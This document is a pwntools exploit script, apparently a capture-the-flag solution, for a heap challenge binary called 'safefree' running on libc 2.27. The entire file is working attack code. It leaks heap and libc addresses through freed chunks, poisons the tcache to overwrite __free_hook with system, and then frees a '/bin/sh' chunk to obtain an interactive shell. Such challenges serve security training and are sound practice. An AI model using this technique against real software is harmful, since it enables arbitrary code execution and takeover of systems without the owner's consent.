#!/usr/bin/python3
from pwn import *

elf = ELF("./safefree")
libc = ELF("./libc-2.27.so")


def alloc(size: int, data: bytes) -> None:
    p.sendline(b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)
    p.recvuntil(b"Choice: ")


def free(index: int, wait=True) -> None:
    p.sendline(b"2")
    p.sendlineafter(b"Index: ", str(index).encode())
    wait and p.recvuntil(b"Choice: ")


def safefree(index: int) -> None:
    p.sendline(b"3")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.recvuntil(b"Choice: ")


def view(index: int) -> bytes:
    p.sendline(b"4")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.recvuntil(b"Data: ")
    leak = p.recvuntil(b"1)", drop=True).rstrip()
    p.recvuntil(b"Choice: ")
    return leak


p = process(elf.path)
p.recvuntil(b"Choice: ")

for _ in range(2):
    alloc(0x10, b"A")

for i in range(2):
    free(i)

for _ in range(9):
    alloc(0x80, b"A")

for i in range(9):
    free(i)

alloc(0x10, b"A")
heap_base = u64(view(0).strip().ljust(8, b"\x00")) & ~0xFFF
p.info(f"heap base @ {heap_base:#x}")
free(0)

alloc(0x20, b"\xa0")
libc_leak = u64(view(0).strip().ljust(8, b"\x00"))
libc.address = libc_leak - 0x3EBCA0
p.info(f"libc base @ {libc.address:#x}")
free(0)

alloc(
    0x20,
    flat(
        p64(0),
        p64(0x21),
        p64(0),
        p64(0),
    ),
)

alloc(0x10, p64(heap_base + 0x6A0))
safefree(1)

free(0)
alloc(
    0x20,
    flat(
        p64(0),
        p64(0x21),
        p64(libc.sym.__free_hook - 0x8),
        p64(heap_base + 0x10),
    ),
)

alloc(0x10, b"/bin/sh\x00")
alloc(0x10, flat(p64(0), p64(libc.sym.__libc_system)))

free(2, wait=False)

p.interactive()
